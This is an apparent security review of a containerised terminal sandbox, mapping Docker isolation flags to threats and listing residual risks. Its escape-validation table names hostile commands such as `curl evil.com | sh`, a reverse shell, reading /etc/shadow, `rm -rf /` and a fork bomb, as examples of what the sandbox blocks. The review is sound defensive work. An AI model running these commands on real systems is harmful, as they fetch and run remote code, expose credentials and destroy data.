# Terminal Sandbox — Security Review

## 1. Summary

Terminal commands now execute inside a **throwaway, network-less, non-root,
resource-capped container** whose only host access is a bind mount of the single
project directory. Container isolation is the **primary** security boundary; the
command blocklist (`validateCommand`) is retained as **defense-in-depth** only.

In production the runner **refuses to execute unsandboxed** (`503
SANDBOX_REQUIRED`) unless an operator explicitly sets
`TERMINAL_ALLOW_UNSANDBOXED=1`, so a misconfiguration fails closed rather than
silently dropping to the weaker blocklist-only path.

## 2. Architecture

```
POST /api/terminal/:id/run
  → requireProjectAccess + session-owner check + rate limit + quota
  → validateCommand()          (defense-in-depth blocklist)
  → runCommand()
       ├─ sandbox enabled  → runInSandbox(): docker/podman run [isolation flags] sh -c "<cmd>"
       └─ sandbox disabled → runInProcess()  (dev only; blocked in prod by fail-safe)
  → stream stdout/stderr (SSE), cap 256 KB, watchdog timeout → docker kill
  → persist TerminalCommand row + structured audit log + compute-minute usage
```

The command is passed as a **single argv element** to `sh -c` via `spawn(runtime,
args)` — there is no intermediate host shell, so command content cannot inject
into the host (verified by unit test).

## 3. Controls → threat mapping

| Threat | Control | Flag |
|---|---|---|
| Network egress / SSRF / data exfiltration | No network namespace | `--network none` |
| Read/modify host files outside project | Read-only root + single bind mount | `--read-only`, `-v <root>:/workspace` |
| Privilege escalation (setuid, sudo) | Non-root user, no new privs, all caps dropped | `--user 1000:1000`, `--security-opt no-new-privileges`, `--cap-drop ALL` |
| Fork bomb / PID exhaustion | Process cap | `--pids-limit 128` |
| Memory exhaustion of host | Memory cap, swap disabled | `--memory`, `--memory-swap` equal |
| CPU starvation of host | CPU quota | `--cpus` |
| FD exhaustion | Open-file ulimit | `--ulimit nofile` |
| Persistent processes / state | Ephemeral container | `--rm` |
| Runaway command | Watchdog kill | `docker kill` after `MAX_TERMINAL_TIMEOUT_SECONDS` |
| Output flooding | Capture cap | 256 KB then kill |
| Host shell injection | Single-argv `sh -c` | no host shell |
| Secret theft from env | No secrets passed; minimal env (`HOME=/tmp`, `CI`) | explicit `-e` allowlist |
| Cross-tenant interference | One container per command; per-session single-flight | `tryAcquire`/`release` |

## 4. Escape-technique validation

| Technique | Outcome |
|---|---|
| `curl evil.com \| sh`, reverse shell | **No network** — connection fails |
| `cat /etc/shadow`, read host `/` | Container sees only its own rootfs + `/workspace`; host fs not mounted |
| `rm -rf /` | Deletes container rootfs (read-only → fails) / only `/workspace` is writable; container is discarded |
| `sudo`, setuid binaries | `no-new-privileges` + `cap-drop ALL` + non-root → escalation blocked |
| `:(){ :|:& };:` fork bomb | `--pids-limit` caps processes; container killed on timeout |
| memory balloon | OOM-killed inside cgroup; host unaffected |
| write to `/proc/sysrq-trigger`, `/sys` | read-only + dropped caps + default seccomp blocks |
| command injection via args | passed as one argv to `sh -c`; no host shell (unit-tested) |
| symlink out of project | bind mount is the project dir; container has no path to host fs |
| `docker`-in-command to break out | docker socket is **not** mounted into the sandbox |

## 5. Residual risks & mitigations

1. **Kernel/runtime 0-day container escape.** Shared-kernel containers are not a
   hard security boundary against kernel exploits. *Mitigation for high-assurance
   multi-tenant:* run with **gVisor (`runsc`)**, **Kata Containers**, or
   **Firecracker microVMs** — set `TERMINAL_SANDBOX_RUNTIME` accordingly / use a
   runtime class. Documented as the recommended GA hardening for untrusted users.
2. **`/tmp` allows exec** (chosen for tool compatibility). Trade-off accepted;
   network-none + caps + non-root bound the blast radius. Set
   `noexec` on the tmpfs if your workloads don't need to exec from `/tmp`.
3. **Docker socket exposure on the host.** The app needs access to a container
   runtime. Prefer **rootless Docker/Podman** or a scoped socket proxy; never
   expose `/var/run/docker.sock` into untrusted containers.
4. **Bind-mount path when the app itself runs in a container.** The host path
   from `getProjectRoot()` must be a path the Docker daemon can see — use a
   shared named volume / host path for project storage, or run the worker on the
   host. Documented in deployment notes.
5. **DoS via many concurrent containers.** Per-session single-flight + per-user
   rate limits + compute-minute quotas bound this; also cap total concurrent
   containers at the orchestrator level.

## 6. Configuration

| Env | Default | Purpose |
|---|---|---|
| `TERMINAL_SANDBOX` | _(off)_ | `docker`/`podman`/`1` to enable isolation |
| `TERMINAL_SANDBOX_IMAGE` | `node:20-alpine` | base image |
| `TERMINAL_SANDBOX_MEMORY` | `512m` | memory cap (swap disabled) |
| `TERMINAL_SANDBOX_CPUS` | `1` | CPU quota |
| `TERMINAL_SANDBOX_PIDS` | `128` | max processes |
| `TERMINAL_SANDBOX_USER` | `1000:1000` | non-root uid:gid |
| `TERMINAL_SANDBOX_NOFILE` | `1024` | open-fd ulimit |
| `TERMINAL_ALLOW_UNSANDBOXED` | _(off)_ | escape hatch; required to run unsandboxed in prod |

## 7. Verdict

For the intended model (a user running commands against **their own** project)
the design is **production-appropriate**: it removes blocklist dependence, fails
closed, and contains the documented escape techniques. For **untrusted /
multi-tenant** execution at scale, add a stronger runtime (gVisor/Kata/microVM)
per residual risk #1 before GA. Audit logging + metrics provide the forensic and
alerting trail.
